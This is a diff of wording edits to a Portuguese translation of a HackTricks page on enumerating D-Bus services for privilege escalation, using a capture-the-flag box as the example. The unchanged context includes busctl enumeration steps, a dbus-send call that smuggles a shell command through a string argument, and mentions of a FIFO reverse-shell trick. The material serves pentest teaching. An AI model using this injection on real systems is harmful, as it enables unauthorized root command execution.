@@ -29,21 +29,21 @@ sudo apt-get install d-feet
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
 
-Na primeira imagem, são mostrados os serviços registrados com o barramento do sistema D-Bus, com **org.debin.apt** especificamente destacado após selecionar o botão do Barramento do Sistema. O D-Feet consulta este serviço para objetos, exibindo interfaces, métodos, propriedades e sinais para os objetos escolhidos, vistos na segunda imagem. A assinatura de cada método também é detalhada.
+Na primeira imagem, são mostrados os serviços registrados com o barramento do sistema D-Bus, com **org.debin.apt** especificamente destacado após selecionar o botão System Bus. O D-Feet consulta este serviço para objetos, exibindo interfaces, métodos, propriedades e sinais para os objetos escolhidos, vistos na segunda imagem. A assinatura de cada método também é detalhada.
 
-Um recurso notável é a exibição do **ID do processo (pid)** e da **linha de comando** do serviço, útil para confirmar se o serviço é executado com privilégios elevados, importante para a relevância da pesquisa.
+Uma característica notável é a exibição do **ID do processo (pid)** e da **linha de comando** do serviço, útil para confirmar se o serviço é executado com privilégios elevados, importante para a relevância da pesquisa.
 
 **O D-Feet também permite a invocação de métodos**: os usuários podem inserir expressões Python como parâmetros, que o D-Feet converte em tipos D-Bus antes de passar para o serviço.
 
 No entanto, observe que **alguns métodos exigem autenticação** antes de nos permitir invocá-los. Vamos ignorar esses métodos, já que nosso objetivo é elevar nossos privilégios sem credenciais em primeiro lugar.
 
-Também observe que alguns dos serviços consultam outro serviço D-Bus chamado org.freedeskto.PolicyKit1 para saber se um usuário deve ou não ser autorizado a realizar determinadas ações.
+Também observe que alguns dos serviços consultam outro serviço D-Bus chamado org.freedeskto.PolicyKit1 para saber se um usuário deve ser autorizado a realizar certas ações ou não.
 
 ## **Enumeração de Linha de Comando**
 
 ### Listar Objetos de Serviço
 
-É possível listar as interfaces D-Bus abertas com:
+É possível listar interfaces D-Bus abertas com:
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -143,9 +143,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 └─/htb/oouch
 └─/htb/oouch/Block
 ```
-### Introspect Interface of a Service Object
+### Introspecionar Interface de um Objeto de Serviço
 
-Observe como neste exemplo foi selecionada a interface mais recente descoberta usando o parâmetro `tree` (_ver seção anterior_):
+Observe como neste exemplo foi selecionada a última interface descoberta usando o parâmetro `tree` (_ver seção anterior_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -163,7 +163,7 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-Observe o método `.Block` da interface `htb.oouch.Block` (aquela que nos interessa). O "s" das outras colunas pode significar que está esperando uma string.
+Observe o método `.Block` da interface `htb.oouch.Block` (a que estamos interessados). O "s" das outras colunas pode significar que está esperando uma string.
 
 ### Interface de Monitoramento/Captura
 
@@ -296,12 +296,12 @@ bus.close()
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-* `dbus-send` é uma ferramenta usada para enviar mensagens para o "Message Bus".
+* `dbus-send` é uma ferramenta usada para enviar mensagens para o "Message Bus"
 * Message Bus - Um software usado por sistemas para facilitar a comunicação entre aplicativos. Está relacionado com a Fila de Mensagens (as mensagens são ordenadas em sequência), mas no Message Bus as mensagens são enviadas em um modelo de assinatura e também são muito rápidas.
 * A tag "-system" é usada para mencionar que é uma mensagem do sistema, não uma mensagem de sessão (por padrão).
 * A tag "--print-reply" é usada para imprimir nossa mensagem adequadamente e receber quaisquer respostas em um formato legível.
 * "--dest=Dbus-Interface-Block" - O endereço da interface Dbus.
-* "--string:" - Tipo de mensagem que gostaríamos de enviar para a interface. Existem vários formatos de envio de mensagens como double, bytes, booleans, int, objpath. Dentre esses, o "objeto de caminho" é útil quando queremos enviar o caminho de um arquivo para a interface Dbus. Podemos usar um arquivo especial (FIFO) nesse caso para passar um comando para a interface com o nome de um arquivo. "string:;" - Isso é para chamar o caminho do objeto novamente onde colocamos o arquivo/comando de shell reverso FIFO.
+* "--string:" - Tipo de mensagem que gostaríamos de enviar para a interface. Existem vários formatos de envio de mensagens como double, bytes, booleans, int, objpath. Dentre esses, o "objeto path" é útil quando queremos enviar o caminho de um arquivo para a interface Dbus. Podemos usar um arquivo especial (FIFO) nesse caso para passar um comando para a interface com o nome de um arquivo. "string:;" - Isso é para chamar o objeto path novamente onde colocamos o arquivo/comando de shell reverso FIFO.
 
 _Obs: Em `htb.oouch.Block.Block`, a primeira parte (`htb.oouch.Block`) faz referência ao objeto de serviço e a última parte (`.Block`) faz referência ao nome do método._
 
@@ -450,7 +450,7 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 ```
 {% endcode %}
 
-# Referências
+## Referências
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 <details>
@@ -463,6 +463,6 @@ Outras maneiras de apoiar o HackTricks:
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
